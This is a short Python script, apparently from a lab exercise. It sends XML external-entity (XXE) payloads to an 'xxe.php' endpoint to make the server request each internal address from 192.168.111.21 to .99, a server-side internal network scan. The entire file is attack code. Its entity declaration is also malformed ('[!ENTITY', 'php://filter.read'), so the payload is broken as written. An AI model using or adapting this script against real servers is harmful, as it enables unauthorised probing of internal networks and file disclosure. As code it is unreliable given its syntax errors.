import requests

def build_xml(ip):
	xml="<?xml version='1.0' encoding='utf-8'?>"
	xml+="<!DOCTYPE xxe[\n"
	xml+="[!ENTITY file SYSTEM 'php://filter.read=convert.base64-encode/resource=http://%s/'\n"%ip
	print(ip)
	xml+="]>\n"
	xml+="<xxe>&file;</xxe>"
	send_xml(xml)

def send_xml(data):
	x=requests.post("http://192.168.111.1/xxe.php",data=data,timeout=3).text
	print(x)

for i in range(21,100):
	try:
		ip="192.168.111.%d"%i
		build_xml(ip)
	except:
		continue
